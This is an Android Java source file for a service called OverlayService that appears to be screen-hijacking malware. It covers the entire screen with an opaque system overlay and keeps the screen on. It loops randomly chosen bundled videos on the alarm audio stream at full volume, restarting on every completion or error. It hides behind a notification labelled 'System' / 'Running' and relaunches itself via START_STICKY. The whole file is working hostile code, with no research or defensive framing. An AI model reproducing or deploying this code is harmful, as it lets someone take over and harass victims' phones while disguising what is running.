package com.rhfvnc.strain;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import java.util.Random;
public class OverlayService extends Service implements SurfaceHolder.Callback,
        MediaPlayer.OnCompletionListener, MediaPlayer.OnErrorListener {
    private WindowManager wm;
    private SurfaceView sv;
    private MediaPlayer mp;
    private final Random rnd = new Random();
    private int lastIdx = -1;

    public static void start(Context c) {
        Intent i = new Intent(c, OverlayService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            android.app.NotificationChannel ch = new android.app.NotificationChannel(
                    "ov", "System", android.app.NotificationManager.IMPORTANCE_MIN);
            android.app.NotificationManager nm = getSystemService(android.app.NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        android.app.Notification n = new android.app.Notification.Builder(this, "ov")
                .setContentTitle("System").setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
        startForeground(3, n);

        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        sv = new SurfaceView(this);
        sv.getHolder().addCallback(this);

        int type;
        if (Build.VERSION.SDK_INT >= 26) type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        else type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE);
        lp.gravity = Gravity.TOP | Gravity.START;

        try { wm.addView(sv, lp); } catch (Throwable ignored) {}
    }

    @Override
    public void surfaceCreated(SurfaceHolder h) { startVideo(); }
    @Override
    public void surfaceChanged(SurfaceHolder h, int f, int w, int hh) {}
    @Override
    public void surfaceDestroyed(SurfaceHolder h) {}

    private void startVideo() {
        int idx;
        do { idx = 1 + rnd.nextInt(6); } while (idx == lastIdx);
        lastIdx = idx;
        int resId = getResources().getIdentifier("v" + idx, "raw", getPackageName());
        if (resId == 0) resId = getResources().getIdentifier("mln", "raw", getPackageName());
        if (resId == 0) return;
        try {
            if (mp != null) { mp.release(); mp = null; }
            mp = new MediaPlayer();
            mp.setAudioStreamType(AudioManager.STREAM_ALARM);
            mp.setVolume(1.0f, 1.0f);
            mp.setDisplay(sv.getHolder());
            Uri u = Uri.parse("android.resource://" + getPackageName() + "/" + resId);
            mp.setDataSource(this, u);
            mp.setOnPreparedListener(MediaPlayer::start);
            mp.setOnCompletionListener(this);
            mp.setOnErrorListener(this);
            mp.prepareAsync();
        } catch (Throwable t) { startVideo(); }
    }

    @Override
    public void onCompletion(MediaPlayer m) { startVideo(); }
    @Override
    public boolean onError(MediaPlayer m, int w, int e) { startVideo(); return true; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Override
    public void onDestroy() {
        try { if (mp != null) mp.release(); } catch (Throwable ignored) {}
        try { if (wm != null && sv != null) wm.removeView(sv); } catch (Throwable ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
